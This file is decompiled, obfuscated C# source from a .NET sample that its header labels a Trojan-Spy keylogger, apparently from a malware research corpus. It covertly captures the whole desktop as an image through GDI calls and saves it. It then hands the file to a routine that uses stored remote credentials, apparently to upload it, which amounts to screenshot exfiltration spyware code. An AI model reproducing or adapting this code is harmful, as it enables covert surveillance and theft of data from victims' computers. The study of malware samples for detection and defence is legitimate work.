// Decompiled with JetBrains decompiler
// Type: ᠾ
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using KeyLogger.Properties;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

internal class ᠾ
{
  public Image \u1819(Image imgToResize, Size size)
  {
    do
      ;
    while (false);
    int width1 = imgToResize.Width;
    int height1 = imgToResize.Height;
    float num1 = (float) size.Width / (float) width1;
    float num2 = (float) size.Height / (float) height1;
    float num3 = (double) num2 >= (double) num1 ? num1 : num2;
    int width2 = (int) ((double) width1 * (double) num3);
    int height2 = (int) ((double) height1 * (double) num3);
    Bitmap bitmap = new Bitmap(width2, height2);
    try
    {
      Graphics graphics = Graphics.FromImage((Image) bitmap);
      graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
      graphics.DrawImage(imgToResize, 0, 0, width2, height2);
      graphics.Dispose();
    }
    catch
    {
    }
    return (Image) bitmap;
  }

  public Image \u1812()
  {
    do
      ;
    while (false);
    return this.\u1816(ᠾ.ᡇᙃ.GetDesktopWindow());
  }

  public Image \u1816(IntPtr handle)
  {
    do
      ;
    while (false);
    IntPtr windowDc = ᠾ.ᡇᙃ.GetWindowDC(handle);
    ᠾ.ᡇᙃ.\u181E rect = new ᠾ.ᡇᙃ.\u181E();
    ᠾ.ᡇᙃ.GetWindowRect(handle, ref rect);
    int nWidth = rect.ᠤ - rect.ᠢ;
    int nHeight = rect.ᠠ - rect.ᠦ;
    IntPtr compatibleDc = ᠾ.ᡆᙃ.CreateCompatibleDC(windowDc);
    IntPtr compatibleBitmap = ᠾ.ᡆᙃ.CreateCompatibleBitmap(windowDc, nWidth, nHeight);
    IntPtr hObject = ᠾ.ᡆᙃ.SelectObject(compatibleDc, compatibleBitmap);
    ᠾ.ᡆᙃ.BitBlt(compatibleDc, 0, 0, nWidth, nHeight, windowDc, 0, 0, 13369376);
    ᠾ.ᡆᙃ.SelectObject(compatibleDc, hObject);
    ᠾ.ᡆᙃ.DeleteDC(compatibleDc);
    ᠾ.ᡇᙃ.ReleaseDC(handle, windowDc);
    Image image = (Image) Image.FromHbitmap(compatibleBitmap);
    ᠾ.ᡆᙃ.DeleteObject(compatibleBitmap);
    return image;
  }

  public void \u1800(IntPtr handle, string filename, ImageFormat format)
  {
    do
      ;
    while (false);
    try
    {
      this.\u1816(handle).Save(filename, format);
    }
    catch
    {
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public void \u1814(string filename, ImageFormat format)
  {
    do
      ;
    while (false);
    try
    {
      this.\u1812().Save(filename, format);
      new អ().ឬ(filename, Settings.Default.RemoteUser, Settings.Default.RemotePass);
    }
    catch
    {
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public ᠾ()
  {
    do
      ;
    while (false);
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  private class ᡆᙃ
  {
    public const int \u181A = 13369376;

    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(
      IntPtr hObject,
      int nXDest,
      int nYDest,
      int nWidth,
      int nHeight,
      IntPtr hObjectSource,
      int nXSrc,
      int nYSrc,
      int dwRop);

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);

    [DllImport("gdi32.dll")]
    public static extern IntPtr CreateCompatibleDC(IntPtr hDC);

    [DllImport("gdi32.dll")]
    public static extern bool DeleteDC(IntPtr hDC);

    [DllImport("gdi32.dll")]
    public static extern bool DeleteObject(IntPtr hObject);

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);

    public ᡆᙃ()
    {
      do
        ;
      while (false);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }
  }

  private class ᡇᙃ
  {
    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowRect(IntPtr hWnd, ref ᠾ.ᡇᙃ.\u181E rect);

    public ᡇᙃ()
    {
      do
        ;
      while (false);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    public struct \u181E
    {
      public int ᠢ;
      public int ᠦ;
      public int ᠤ;
      public int ᠠ;
    }
  }
}
